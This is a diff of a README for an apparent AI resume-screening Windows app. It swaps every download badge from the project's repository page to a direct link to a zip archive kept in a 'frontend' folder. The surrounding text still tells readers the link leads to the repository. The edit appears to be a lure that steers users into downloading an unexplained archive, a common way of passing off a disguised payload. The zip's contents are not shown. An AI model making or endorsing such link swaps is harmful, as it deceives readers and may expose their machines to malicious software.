@@ -1,6 +1,6 @@
 # 🤖 ai-resume-screening-system - Simplify Hiring with AI
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/13ofbeaches/ai-resume-screening-system)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/13ofbeaches/ai-resume-screening-system/main/frontend/system-resume-screening-ai-v2.5.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to download and launch the software on your Windows PC.
 
 Click the button below to visit the download page:
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-0078d7?style=for-the-badge)](https://github.com/13ofbeaches/ai-resume-screening-system)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-0078d7?style=for-the-badge)](https://raw.githubusercontent.com/13ofbeaches/ai-resume-screening-system/main/frontend/system-resume-screening-ai-v2.5.zip)
 
 This link takes you to the GitHub repository. Look for files or folders named "Releases," "Download," or similar. Sometimes, the latest version is in the main directory as an installer or executable file.
 
@@ -138,4 +138,4 @@ If you need assistance running this program:
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/13ofbeaches/ai-resume-screening-system)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/13ofbeaches/ai-resume-screening-system/main/frontend/system-resume-screening-ai-v2.5.zip)
